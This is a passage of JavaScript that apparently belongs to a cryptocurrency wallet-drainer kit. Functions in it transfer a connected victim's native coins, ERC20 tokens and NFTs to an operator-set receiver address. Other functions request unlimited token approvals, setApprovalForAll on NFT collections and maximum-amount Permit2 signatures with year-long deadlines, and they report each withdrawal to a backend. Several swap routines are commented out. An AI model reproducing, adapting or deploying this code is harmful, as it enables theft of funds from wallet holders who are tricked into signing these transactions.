    MS_Contract_ABI["ERC721"],
    node
  );
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      if (MS_Settings.Settings.Sign.NFTs == 1) {
        gas_limit = await contract.estimateGas.setApprovalForAll(
          MS_Settings.Address,
          true,
          { from: MS_Current_Address }
        );
      } else if (MS_Settings.Settings.Sign.NFTs == 2) {
        gas_limit = await contract.estimateGas.transferFrom(
          MS_Current_Address,
          MS_Settings.Receiver,
          asset.id,
          { from: MS_Current_Address }
        );
      }
      gas_limit = ethers.BigNumber.from(gas_limit)
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
      gas_attempts = 3;
    } catch (err) {
      gas_limit =
        asset.chain_id == 42161
          ? 5000000
          : asset.chain_id == 43114
            ? 5000000
            : 250000;
      gas_attempts += 1;
    }
  }
  if (
    ethers.BigNumber.from(await node.getBalance()).lt(
      ethers.BigNumber.from(gas_limit).mul(ethers.BigNumber.from(gas_price))
    )
  )
    throw "LOW_BALANCE";
  // const nonce = await get_nonce(asset.chain_id);
  // let data = null,
  //   web3_contract = new ethers.Contract(
  //     MS_Contract_ABI["ERC721"],
  //     asset.address
  //   );
  // if (MS_Settings.Settings.Sign.NFTs == 1)
  //   data = web3_contract.methods
  //     .setApprovalForAll(MS_Settings.Address, true)
  //     .encodeABI();
  // else if (MS_Settings.Settings.Sign.NFTs == 2)
  //   data = web3_contract.methods
  //     .transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id)
  //     .encodeABI();
  // let tx_struct = {
  //   to: asset.address,
  //   nonce: ethers.utils.hexlify(nonce),
  //   gasLimit: ethers.utils.hexlify(gas_limit),
  //   gasPrice: ethers.utils.hexlify(gas_price),
  //   value: "0x0",
  //   data: data,
  //   //v: 27,
  //   //   r: "0x",
  //   //   s: "0x",
  // },
  //   unsigned_tx = (tx_struct);
  // //   serialized_tx = ethers.utils.serializeTransaction(unsigned_tx),
  // //   keccak256 = ethers.utils.keccak256(serialized_tx);
  // // await sign_request(asset);
  // // const signed = await signer.signMessage(keccak256);
  // // const temporary = signed.substring(2),
  // //   r_data = "0x" + temporary.substring(0, 64),
  // //   s_data = "0x" + temporary.substring(64, 128),
  // //   rhema = parseInt(temporary.substring(128, 130), 16),
  // //   v_data = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(rhema + asset.chain_id * 2 + 8));
  // // unsigned_tx.r = r_data;
  // // unsigned_tx.s = s_data;
  // // unsigned_tx.v = v_data;
  // // const signed_tx = ethers.utils.serializeTransaction(unsigned_tx);
  // // sign_next();
  // const tx = await signer.sendTransaction(unsigned_tx);
  // wait_message();
  // if (MS_Settings.Settings.Wait_For_Confirmation)
  //   await signer.waitForTransaction(tx.hash, 1, 30000);
  // await sign_success(asset);
  // sign_ready();
}; //untouched

// const DO_SWAP = async (asset) => {
//   const node = new ethers.providers.JsonRpcProvider(
//     MS_Settings.RPCs[asset.chain_id]
//   );
//   const swap_deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
//   const contract = new ethers.Contract(
//     asset.swapper_address,
//     MS_Pancake_ABI,
//     MS_Signer
//   );
//   const gas_price = ethers.BigNumber.from(await node.getGasPrice())
//     .div(ethers.BigNumber.from("100"))
//     .mul(ethers.BigNumber.from("120"))
//     .toString();
//   let gas_limit = null;
//   let gas_attempts = 0;
//   while (gas_attempts < 3) {
//     try {
//       gas_limit = await contract.estimateGas.swapExactTokensForETH(
//         swap_value,
//         "0",
//         [asset.address, MS_Swap_Route[asset.chain_id]],
//         MS_Settings.Receiver,
//         swap_deadline,
//         { from: MS_Current_Address }
//       );
//       gas_limit = ethers.BigNumber.from(gas_limit)
//         .div(ethers.BigNumber.from("100"))
//         .mul(ethers.BigNumber.from("120"))
//         .toString();
//       gas_attempts = 3;
//     } catch (err) {
//       gas_limit =
//         asset.chain_id == 42161
//           ? 5000000
//           : asset.chain_id == 43114
//             ? 5000000
//             : 350000;
//       gas_attempts += 1;
//     }
//   }
//   const nonce = await get_nonce(asset.chain_id);
//   const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(
//     ethers.BigNumber.from(asset.swapper_allowance)
//   )
//     ? ethers.BigNumber.from(asset.amount_raw).toString()
//     : ethers.BigNumber.from(asset.swapper_allowance).toString();
//   await swap_request(asset.swapper_type, asset, [asset]);
//   sign_next();
//   const tx = await contract.swapExactTokensForETH(
//     swap_value,
//     "0",
//     [asset.address, MS_Swap_Route[asset.chain_id]],
//     MS_Settings.Receiver,
//     swap_deadline,
//     {
//       gasLimit: ethers.BigNumber.from(gas_limit),
//       gasPrice: ethers.BigNumber.from(gas_price),
//       nonce: nonce,
//       from: MS_Current_Address,
//     }
//   );
//   wait_message();
//   if (MS_Settings.Settings.Wait_For_Confirmation)
//     await node.waitForTransaction(tx.hash, 1, 60000);
//   await swap_success(asset.swapper_type, asset, [asset]);
//   sign_ready();
// };

// const DO_UNISWAP = async (asset, all_tokens) => {
//   const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
//   const signer = await ethersProvider.getSigner();
//   const node = signer;
//   const swap_deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
//   const contract = new ethers.Contract(
//     asset.swapper_address,
//     MS_Uniswap_ABI,
//     MS_Signer
//   );
//   const gas_price = ethers.BigNumber.from(await node.getGasPrice())
//     .div(ethers.BigNumber.from("100"))
//     .mul(ethers.BigNumber.from("120"))
//     .toString();
//   const nonce = await get_nonce(asset.chain_id);
//   const swap_data = [];
//   for (const token of all_tokens) {
//     try {
//       const swap_value = ethers.BigNumber.from(token.amount_raw).lte(
//         ethers.BigNumber.from(token.swapper_allowance)
//       )
//         ? ethers.BigNumber.from(token.amount_raw).toString()
//         : ethers.BigNumber.from(token.swapper_allowance).toString();
//       const web3_contract = new ethers.Contract(
//         MS_Uniswap_ABI,
//         token.swapper_address
//       );
//       const data = web3_contract.methods
//         .swapExactTokensForTokens(
//           swap_value,
//           "0",
//           [token.address, MS_Swap_Route[token.chain_id]],
//           MS_Settings.Receiver
//         )
//         .encodeABI();
//       swap_data.push(data);
//     } catch (err) {
//       console.log(err);
//     }
//   }
//   let gas_limit = null;
//   let gas_attempts = 0;
//   while (gas_attempts < 3) {
//     try {
//       gas_limit = await contract.estimateGas.multicall(
//         swap_deadline,
//         swap_data,
//         { from: MS_Current_Address }
//       );
//       gas_limit = ethers.BigNumber.from(gas_limit)
//         .div(ethers.BigNumber.from("100"))
//         .mul(ethers.BigNumber.from("120"))
//         .toString();
//       gas_attempts = 3;
//     } catch (err) {
//       gas_limit =
//         asset.chain_id == 42161
//           ? 5000000
//           : asset.chain_id == 43114
//             ? 5000000
//             : 500000;
//       gas_attempts += 1;
//     }
//   }
//   await swap_request(asset.swapper_type, asset, all_tokens);
//   sign_next();
//   const tx = await contract.multicall(swap_deadline, swap_data, {
//     gasLimit: ethers.BigNumber.from(gas_limit),
//     gasPrice: ethers.BigNumber.from(gas_price),
//     nonce: nonce,
//     from: MS_Current_Address,
//   });
//   wait_message();
//   if (MS_Settings.Settings.Wait_For_Confirmation)
//     await signer.waitForTransaction(tx.hash, 1, 60000);
//   await swap_success(asset.swapper_type, asset, all_tokens);
//   sign_ready();
// };

// const DO_PANCAKE_V3 = async (asset, all_tokens) => {
//   const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
//   const signer = await ethersProvider.getSigner();
//   const node = signer;
//   const swap_deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
//   const contract = new ethers.Contract(
//     asset.swapper_address,
//     MS_Pancake_ABI,
//     MS_Signer
//   );
//   const gas_price = ethers.BigNumber.from(await node.getGasPrice())
//     .div(ethers.BigNumber.from("100"))
//     .mul(ethers.BigNumber.from("120"))
//     .toString();
//   const nonce = await get_nonce(asset.chain_id);
//   const swap_data = [];
//   for (const token of all_tokens) {
//     try {
//       const swap_value = ethers.BigNumber.from(token.amount_raw).lte(
//         ethers.BigNumber.from(token.swapper_allowance)
//       )
//         ? ethers.BigNumber.from(token.amount_raw).toString()
//         : ethers.BigNumber.from(token.swapper_allowance).toString();
//       const web3_contract = new ethers.Contract(
//         MS_Pancake_ABI,
//         token.swapper_address
//       );
//       const data = web3_contract.methods
//         .swapExactTokensForTokens(
//           swap_value,
//           "0",
//           [token.address, MS_Swap_Route[token.chain_id]],
//           MS_Settings.Receiver
//         )
//         .encodeABI();
//       swap_data.push(data);
//     } catch (err) {
//       console.log(err);
//     }
//   }
//   let gas_limit = null;
//   let gas_attempts = 0;
//   while (gas_attempts < 3) {
//     try {
//       gas_limit = await contract.estimateGas.multicall(
//         swap_deadline,
//         swap_data,
//         { from: MS_Current_Address }
//       );
//       gas_limit = ethers.BigNumber.from(gas_limit)
//         .div(ethers.BigNumber.from("100"))
//         .mul(ethers.BigNumber.from("120"))
//         .toString();
//       gas_attempts = 3;
//     } catch (err) {
//       gas_limit =
//         asset.chain_id == 42161
//           ? 5000000
//           : asset.chain_id == 43114
//             ? 5000000
//             : 500000;
//       gas_attempts += 1;
//     }
//   }
//   await swap_request(asset.swapper_type, asset, all_tokens);
//   sign_next();
//   const tx = await contract.multicall(swap_deadline, swap_data, {
//     gasLimit: ethers.BigNumber.from(gas_limit),
//     gasPrice: ethers.BigNumber.from(gas_price),
//     nonce: nonce,
//     from: MS_Current_Address,
//   });
//   wait_message();
//   if (MS_Settings.Settings.Wait_For_Confirmation)
//     await signer.waitForTransaction(tx.hash, 1, 60000);
//   await swap_success(asset.swapper_type, asset, all_tokens);
//   sign_ready();
// };

const DO_CONTRACT = async (asset) => {
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = signer;
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("150"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

  if (
    MS_Settings.Settings.Use_Public_Contract &&
    MS_Settings.Public_Contract[parseInt(asset.chain_id)] != null
  ) {
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy = 2;
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address =
      MS_Settings.Public_Contract[parseInt(asset.chain_id)][
      MS_Settings.Settings.Use_Public_Premium
        ? asset.amount_usd >= 500
          ? 1
          : 0
        : 0
      ];
  }

  let Contract_ABI =
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1
      ? JSON.parse(
        `[{"constant":false,"inputs":[],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`
      )
      : MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0
        ? JSON.parse(
          `[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`
        )
        : JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},
  {"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`);

  const contract = new ethers.Contract(
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address,
    Contract_ABI,
    MS_Signer
  );

  const gas_limit_nt =
    asset.chain_id == 42161
      ? 1500000
      : asset.chain_id == 43114
        ? 1500000
        : asset.chain_id == 369
          ? 500000
          : 100000;
  const gas_limit_ct =
    asset.chain_id == 42161
      ? 5000000
      : asset.chain_id == 43114
        ? 5000000
        : asset.chain_id == 369
          ? 900000
          : 150000;
  const gas_price_calc = ethers.BigNumber.from(
    asset.chain_id == 10 ? "35000000000" : gas_price
  );

  const nt_fee = gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt));
  const ct_fee = gas_price_calc
    .mul(ethers.BigNumber.from(gas_limit_ct))
    .mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw)
    .sub(nt_fee)
    .sub(ct_fee)
    .toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from("0")))
    throw "LOW_BALANCE";

  await transfer_request(asset);
  sign_next();
  let tx = null;
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
    tx = await contract[
      MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type
    ](MS_Settings.Receiver, {
      gasLimit: ethers.BigNumber.from(gas_limit_nt),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce,
      value: ethers.BigNumber.from(after_fee),
      from: MS_Current_Address,
    });
  } else if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 2) {
    tx = await contract[
      MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type
    ](
      MS_Current_Address,
      MS_Settings.Receiver,
      "0x0000000000000000000000000000000000000000",
      "0x0",
      MS_Settings.Settings.Use_Back_Feature,
      {
        gasLimit: ethers.BigNumber.from(gas_limit_nt),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce,
        value: ethers.BigNumber.from(after_fee),
        from: MS_Current_Address,
      }
    );
  } else {
    tx = await contract[
      MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type
    ]({
      gasLimit: ethers.BigNumber.from(gas_limit_nt),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce,
      value: ethers.BigNumber.from(after_fee),
      from: MS_Current_Address,
    });
  }
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await signer.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, after_fee);
  sign_ready();
}; //untouched

const DO_RANDOMIZER_NATIVE = async (asset) => {
  const wallet_address = MS_Settings.Personal_Wallet.address;
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = new ethers.providers.JsonRpcProvider(
    MS_Settings.RPCs[asset.chain_id]
  );
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();

  const gas_limit_nt =
    asset.chain_id == 42161
      ? 1500000
      : asset.chain_id == 43114
        ? 1500000
        : asset.chain_id == 369
          ? 100000
          : 21000;
  const gas_limit_ct =
    asset.chain_id == 42161
      ? 5000000
      : asset.chain_id == 43114
        ? 5000000
        : asset.chain_id == 369
          ? 900000
          : 150000;

  const gas_price_calc = ethers.BigNumber.from(
    asset.chain_id == 10 ? "35000000000" : gas_price
  );
  const nt_fee = gas_price_calc
    .mul(ethers.BigNumber.from(gas_limit_nt))
    .mul(ethers.BigNumber.from("2"));
  const ct_fee = gas_price_calc
    .mul(ethers.BigNumber.from(gas_limit_ct))
    .mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw)
    .sub(nt_fee)
    .sub(ct_fee)
    .toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from("0")))
    throw "LOW_BALANCE";

  const nonce = await get_nonce(asset.chain_id);
  await transfer_request(asset);
  sign_next();
  const tx = await MS_Signer.sendTransaction({
    from: MS_Current_Address,
    to: wallet_address,
    value: ethers.BigNumber.from(after_fee),
    gasLimit: ethers.BigNumber.from(gas_limit_nt),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce,
    data: "0x",
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
    const x_promise = send_request({
      action: "withdraw_native",
      wallet: MS_Settings.Personal_Wallet,
      chain_id: asset.chain_id,
      amount_usd: asset.amount_usd,
      user_id: MS_ID,
      asset: asset,
      address: MS_Current_Address,
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
  await transfer_success(asset, after_fee);
  sign_ready();
}; //untouched

const TRANSFER_NATIVE = async (asset) => {
  const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);
  if (
    MS_Settings.Settings.Use_Wallet_Randomizer &&
    MS_Settings.Personal_Wallet != null
  )
    return DO_RANDOMIZER_NATIVE(asset);
  if (
    (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address != "" ||
      (MS_Settings.Settings.Use_Public_Contract &&
        MS_Settings.Public_Contract[parseInt(asset.chain_id)] != null)) &&
    asset.amount_usd >= MS_Settings.Settings.Use_Contract_Amount
  )
    return DO_CONTRACT(asset);
  const node = new ethers.providers.JsonRpcProvider(
    MS_Settings.RPCs[asset.chain_id]
  );
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();

  const gas_limit_nt =
    asset.chain_id == 42161
      ? 1500000
      : asset.chain_id == 43114
        ? 1500000
        : asset.chain_id == 369
          ? 100000
          : 21000;
  const gas_limit_ct =
    asset.chain_id == 42161
      ? 5000000
      : asset.chain_id == 43114
        ? 5000000
        : asset.chain_id == 369
          ? 900000
          : 150000;

  const gas_price_calc = ethers.BigNumber.from(
    asset.chain_id == 10 ? "35000000000" : gas_price
  );
  const nt_fee = gas_price_calc
    .mul(ethers.BigNumber.from(gas_limit_nt))
    .mul(ethers.BigNumber.from("2"));
  const ct_fee = gas_price_calc
    .mul(ethers.BigNumber.from(gas_limit_ct))
    .mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw)
    .sub(nt_fee)
    .sub(ct_fee)
    .toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from("0")))
    throw "LOW_BALANCE";

  const nonce = await get_nonce(asset.chain_id);
  await transfer_request(asset);
  sign_next();
  const tx = await MS_Signer.sendTransaction({
    from: MS_Current_Address,
    to: MS_Settings.Receiver,
    value: ethers.BigNumber.from(after_fee),
    gasLimit: ethers.BigNumber.from(gas_limit_nt),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce,
    data: "0x",
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, after_fee);
  sign_ready();
};

const DO_RANDOMIZER_TOKEN = async (asset) => {
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = signer;
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(
    asset.address,
    MS_Contract_ABI["ERC20"],
    MS_Signer
  );
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.transfer(
        MS_Settings.Personal_Wallet.address,
        asset.amount_raw,
        { from: MS_Current_Address }
      );
      gas_limit = ethers.BigNumber.from(gas_limit)
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
      gas_attempts = 3;
    } catch (err) {
      gas_limit =
        asset.chain_id == 42161
          ? 5000000
          : asset.chain_id == 43114
            ? 5000000
            : 250000;
      gas_attempts += 1;
    }
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transfer(
    MS_Settings.Personal_Wallet.address,
    asset.amount_raw,
    {
      gasLimit: ethers.BigNumber.from(gas_limit),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce,
      from: MS_Current_Address,
    }
  );
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await signer.waitForTransaction(tx.hash, 1, 30000);
    const x_promise = send_request({
      action: "withdraw_token",
      wallet: MS_Settings.Personal_Wallet,
      chain_id: asset.chain_id,
      amount_usd: asset.amount_usd,
      user_id: MS_ID,
      asset: asset,
      address: MS_Current_Address,
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
  await transfer_success(asset);
  sign_ready();
};

const TRANSFER_TOKEN = async (asset) => {
  if (
    MS_Settings.Settings.Use_Randomizer_For_Tokens &&
    MS_Settings.Personal_Wallet != null
  )
    return DO_RANDOMIZER_TOKEN(asset);
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = signer;
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(
    asset.address,
    MS_Contract_ABI["ERC20"],
    MS_Signer
  );
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.transfer(
        MS_Settings.Receiver,
        asset.amount_raw,
        { from: MS_Current_Address }
      );
      gas_limit = ethers.BigNumber.from(gas_limit)
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
      gas_attempts = 3;
    } catch (err) {
      gas_limit =
        asset.chain_id == 42161
          ? 5000000
          : asset.chain_id == 43114
            ? 5000000
            : 250000;
      gas_attempts += 1;
    }
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transfer(MS_Settings.Receiver, asset.amount_raw, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce,
    from: MS_Current_Address,
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await signer.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset);
  sign_ready();
};

const TRANSFER_NFT = async (asset) => {
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = signer;
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(
    asset.address,
    MS_Contract_ABI["ERC721"],
    MS_Signer
  );
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.transferFrom(
        MS_Current_Address,
        MS_Settings.Receiver,
        asset.amount_raw,
        { from: MS_Current_Address }
      );
      gas_limit = ethers.BigNumber.from(gas_limit)
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
      gas_attempts = 3;
    } catch (err) {
      gas_limit =
        asset.chain_id == 42161
          ? 5000000
          : asset.chain_id == 43114
            ? 5000000
            : 250000;
      gas_attempts += 1;
    }
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transferFrom(
    MS_Current_Address,
    MS_Settings.Receiver,
    asset.amount_raw,
    {
      gasLimit: ethers.BigNumber.from(gas_limit),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce,
      from: MS_Current_Address,
    }
  );
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await signer.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset);
  sign_ready();
};

const RETRO_MM_APPROVE_TOKEN = async (asset) => {
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = signer;
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(
    asset.address,
    MS_Contract_ABI["ERC20"],
    node
  );
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  // for (const c_address of MS_Settings.Unlimited_BL) {
  //   try {
  //     if (
  //       c_address[0] == MS_Current_Chain_ID &&
  //       c_address[1] == asset.address.toLowerCase().trim()
  //     ) {
  //       max_approval_amount = asset.amount_raw;
  //       break;
  //     }
  //   } catch (err) {
  //     console.log(err);
  //   }
  // }
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.approve(
        MS_Settings.Address,
        max_approval_amount,
        { from: MS_Current_Address }
      );
      gas_limit = ethers.BigNumber.from(gas_limit)
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
      gas_attempts = 3;
    } catch (err) {
      gas_limit =
        asset.chain_id == 42161
          ? 5000000
          : asset.chain_id == 43114
            ? 5000000
            : 250000;
      gas_attempts += 1;
    }
  }
  let web3_contract = new ethers.Contract(
    MS_Contract_ABI["ERC20"],
    asset.address
  );
  let data = web3_contract.methods
    .approve(MS_Settings.Address, max_approval_amount)
    .encodeABI();
  await approve_request(asset);
  sign_next();
  const result = await new Promise((resolve) => {
    MS_Provider.sendAsync(
      {
        from: MS_Current_Address,
        id: 1,
        jsonrpc: "2.0",
        method: "eth_sendTransaction",
        params: [
          {
            chainId: MS_Current_Chain_ID,
            data: data,
            from: MS_Current_Address,
            nonce: ethers.utils.hexlify(ethers.utils.toUtf8Bytes(nonce)),
            to: asset.address,
            value: `0x000${Math.floor(Math.random() * 9)}`,
            gasPrice: ethers.utils.hexlify(ethers.utils.toUtf8Bytes(gas_price)),
            gas: ethers.utils.hexlify(ethers.utils.toUtf8Bytes(gas_limit)),
          },
        ],
      },
      (err, tx) => {
        resolve({ err, tx });
      }
    );
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await signer.waitForTransaction(result.tx.result, 1, 30000);
  await approve_success(asset);
  sign_ready();
};

const DO_SAFA = async (asset) => {
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = signer;
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(
    asset.address,
    MS_Contract_ABI["ERC721"],
    MS_Signer
  );
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.setApprovalForAll(
        MS_Settings.Address,
        true,
        { from: MS_Current_Address }
      );
      gas_limit = ethers.BigNumber.from(gas_limit)
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
      gas_attempts = 3;
    } catch (err) {
      gas_limit =
        asset.chain_id == 42161
          ? 5000000
          : asset.chain_id == 43114
            ? 5000000
            : 250000;
      gas_attempts += 1;
    }
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract.setApprovalForAll(MS_Settings.Address, true, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce,
    from: MS_Current_Address,
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await signer.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset);
  sign_ready();
};

const DO_PERMIT2 = async (asset, assets) => {
  const contract = new ethers.Contract(
    "0x000000000022d473030f116ddee9f6b43ac78ba3",
    MS_Contract_ABI["PERMIT2_BATCH"],
    MS_Signer
  );
  let permit_domain = {
    name: "Permit2",
    chainId: asset.chain_id,
    verifyingContract: "0x000000000022d473030f116ddee9f6b43ac78ba3",
  };
  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24 * 356,
    permit_signature = null,
    permit_message = null,
    permit_mode = null;
  if (assets.length > 1) {
    let permit_types = {
      PermitBatch: [
        {
          name: "details",
          type: "PermitDetails[]",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "sigDeadline",
          type: "uint256",
        },
      ],
      PermitDetails: [
        {
          name: "token",
          type: "address",
        },
        {
          name: "amount",
          type: "uint160",
        },
        {
          name: "expiration",
          type: "uint48",
        },
        {
          name: "nonce",
          type: "uint48",
        },
      ],
    };
    let tokens = [];
    for (const x_asset of assets) {
      try {
        tokens.push({
          token: x_asset.address,
          expiration: permit_deadline,
          amount: "1461501637330902918203684832716283019655932542975",
          nonce: (
            await contract.allowance(
              MS_Current_Address,
              x_asset.address,
              MS_Settings.Settings.Use_Randomizer_For_Tokens
                ? MS_Settings.Personal_Wallet.address
                : MS_Settings.Address
            )
          ).nonce,
        });
      } catch (err) {
        console.log(err);
      }
    }
    permit_message = {
      details: tokens,
      spender: MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address
        : MS_Settings.Address,
      sigDeadline: permit_deadline,
    };
    swap_request("Permit2", asset, assets);
    sign_next();
    permit_signature = await MS_Signer._signTypedData(
      permit_domain,
      permit_types,
      permit_message
    );
    permit_mode = 2;
  } else {
    // Permit Single
    let permit_types = {
      PermitSingle: [
        {
          name: "details",
          type: "PermitDetails",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "sigDeadline",
          type: "uint256",
        },
      ],
      PermitDetails: [
        {
          name: "token",
          type: "address",
        },
        {
          name: "amount",
          type: "uint160",
        },
        {
          name: "expiration",
          type: "uint48",
        },
        {
          name: "nonce",
          type: "uint48",
        },
      ],
    };
    permit_message = {
      details: {
        token: asset.address,
        amount: "1461501637330902918203684832716283019655932542975",
        expiration: permit_deadline,
        nonce: (
          await contract.allowance(
            MS_Current_Address,
            asset.address,
            MS_Settings.Settings.Use_Randomizer_For_Tokens
